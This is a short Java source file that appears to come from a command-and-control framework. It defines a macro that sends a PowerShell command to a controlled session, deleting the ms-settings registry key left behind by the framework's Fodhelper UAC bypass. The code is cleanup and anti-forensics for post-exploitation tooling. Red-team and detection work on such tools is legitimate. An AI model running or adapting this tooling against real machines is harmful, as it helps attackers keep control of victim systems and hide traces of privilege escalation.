package c2.session.macro;

public class CleanFodhelperMacro extends AbstractCommandMacro {

	public static final String COMMAND = "clean_fodhelper";
	public static final String CLIENT_COMMAND = "powershell.exe -c \"Remove-Item 'HKCU:\\Software\\Classes\\ms-settings\\' -Recurse -Force\"";
	
	@Override
	public boolean isCommandMatch(String cmd) {
		return cmd.equalsIgnoreCase(COMMAND);
	}

	@Override
	public MacroOutcome processCmd(String cmd, int sessionId, String sessionStr) {
		MacroOutcome outcome = new MacroOutcome();
		sendCommand(CLIENT_COMMAND, sessionId, outcome);
		outcome.addMacroMessage("Fodhelper registry cleaned up");
		return outcome;
	}

	@Override
	public String getReadableName() {
		return "Clean Fodhelper";
	}

	@Override
	public String getInvocationCommandDescription() {
		return COMMAND;
	}

	@Override
	public String getBehaviorDescription() {
		return "This macro cleares the registry key used by the FOD Helper UAC bypass macro";
	}

}
